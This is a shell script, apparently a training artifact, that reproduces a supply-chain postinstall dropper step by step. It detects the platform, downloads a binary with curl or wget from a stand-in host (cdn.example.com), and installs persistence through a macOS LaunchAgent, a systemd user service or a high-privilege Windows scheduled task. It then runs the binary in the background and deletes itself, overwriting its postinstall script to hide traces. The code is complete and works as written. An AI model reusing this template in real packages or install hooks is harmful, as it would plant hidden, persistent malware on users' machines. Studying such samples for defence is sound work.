#!/bin/sh
# ===========================================================================
# SYNTHETIC EXERCISE ARTIFACT — NOT REAL MALWARE
# This script mimics the behavior of a supply-chain attack postinstall dropper
# similar to the March 2026 axios/plain-crypto-js compromise.
# All URLs point to example.com (IANA reserved, resolves nowhere).
# All file paths use clearly fake names. Safe to read and analyze.
# ===========================================================================

# --- Stage 1: Platform detection ---
# The dropper identifies the target OS to deploy the correct payload variant.

OS_TYPE="unknown"
ARCH_TYPE="unknown"

case "$(uname -s)" in
    Darwin)
        OS_TYPE="macos"
        ;;
    Linux)
        OS_TYPE="linux"
        ;;
    CYGWIN*|MINGW*|MSYS*)
        OS_TYPE="windows"
        ;;
esac

case "$(uname -m)" in
    x86_64|amd64)
        ARCH_TYPE="x64"
        ;;
    arm64|aarch64)
        ARCH_TYPE="arm64"
        ;;
esac

# --- Stage 2: Payload download ---
# Fetches a platform-specific binary from the attacker's CDN.
# In the real attack, this was an obfuscated URL with rotating subdomains.

PAYLOAD_URL="https://cdn.example.com/packages/${OS_TYPE}/${ARCH_TYPE}/update-helper"
PAYLOAD_PATH="/tmp/.not-a-real-payload"

curl -sL "${PAYLOAD_URL}" -o "${PAYLOAD_PATH}" 2>/dev/null || \
wget -q "${PAYLOAD_URL}" -O "${PAYLOAD_PATH}" 2>/dev/null

chmod +x "${PAYLOAD_PATH}" 2>/dev/null

# --- Stage 3: Persistence installation ---
# Ensures the payload survives reboots by installing platform-specific persistence.

if [ "${OS_TYPE}" = "macos" ]; then
    # macOS: LaunchAgent (runs on user login)
    PLIST_PATH="${HOME}/Library/LaunchAgents/com.example.update-helper.plist"
    mkdir -p "${HOME}/Library/LaunchAgents" 2>/dev/null
    cat > "${PLIST_PATH}" << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.update-helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/.not-a-real-payload</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/.update-helper.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/.update-helper.err</string>
</dict>
</plist>
PLIST
    launchctl load "${PLIST_PATH}" 2>/dev/null

elif [ "${OS_TYPE}" = "linux" ]; then
    # Linux: systemd user service
    SERVICE_DIR="${HOME}/.config/systemd/user"
    mkdir -p "${SERVICE_DIR}" 2>/dev/null
    cat > "${SERVICE_DIR}/update-helper.service" << 'UNIT'
[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.not-a-real-payload
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
UNIT
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable update-helper.service 2>/dev/null
    systemctl --user start update-helper.service 2>/dev/null

elif [ "${OS_TYPE}" = "windows" ]; then
    # Windows (via MSYS/Cygwin): scheduled task
    schtasks /create /tn "UpdateHelper" /tr "${PAYLOAD_PATH}" \
        /sc onlogon /rl highest /f 2>/dev/null
fi

# --- Stage 4: Payload execution ---
# Runs the downloaded binary in the background.

nohup "${PAYLOAD_PATH}" >/dev/null 2>&1 &

# --- Stage 5: Self-cleaning ---
# Removes evidence of the dropper. In the real attack, this also replaced
# the postinstall script with a benign version.

rm -f "$0" 2>/dev/null

# Replace this package's postinstall with a no-op
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
echo '#!/bin/sh' > "${SCRIPT_DIR}/postinstall.sh" 2>/dev/null
echo '# postinstall complete' >> "${SCRIPT_DIR}/postinstall.sh" 2>/dev/null

exit 0
